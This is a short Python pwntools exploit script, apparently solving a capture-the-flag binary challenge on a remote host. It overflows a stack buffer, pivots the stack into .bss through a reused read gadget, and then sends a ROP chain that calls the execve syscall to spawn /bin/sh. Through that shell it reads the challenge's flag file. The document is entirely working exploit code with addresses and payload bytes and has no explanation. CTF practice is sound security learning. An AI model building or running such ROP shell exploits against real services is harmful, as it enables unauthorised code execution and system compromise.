from pwn import *
import time
context.arch = 'amd64'
r = remote('10.113.184.121', 10054)
#0x0000000000401832 : pop rdi ; ret
#0x000000000040f01e : pop rsi ; ret
#0x000000000047dcba : pop rax ; pop rdx ; pop rbx ; ret
pop_rdi = 0x0000000000401832
pop_rsi = 0x000000000040f01e
pop_rax_rdx_rbx = 0x000000000047dcba
'''
  448280:       0f 05                   syscall
  448282:       48 3d 00 f0 ff ff       cmp    $0xfffffffffffff000,%rax
  448288:       77 56                   ja     4482e0 <__libc_read+0x70>
  44828a:       c3                      ret
'''
syscall = 0x448280
'''
  401ce1:       48 8d 45 e0             lea    -0x20(%rbp),%rax
  401ce5:       ba 80 00 00 00          mov    $0x80,%edx
  401cea:       48 89 c6                mov    %rax,%rsi
  401ced:       bf 00 00 00 00          mov    $0x0,%edi
  401cf2:       e8 79 65 04 00          call   448270 <__libc_read>
  401cf7:       b8 00 00 00 00          mov    $0x0,%eax
  401cfc:       c9                      leave
'''
read = 0x401ce1
bss = 0x4c2400

rop = flat([bss, # rbp
            read])
payload = b'a' * 0x20 + rop
r.sendline(payload)

rop = flat([pop_rdi, bss - 0x20,
            pop_rsi, 0,
            pop_rax_rdx_rbx, 59, 0, 0,
            syscall])
payload = b'/bin/sh'.ljust(0x28, b'\x00') + rop
r.sendline(payload)
time.sleep(0.1)
r.sendline(b'cat /home/chal/flag.txt')
print(r.recvline())
r.close()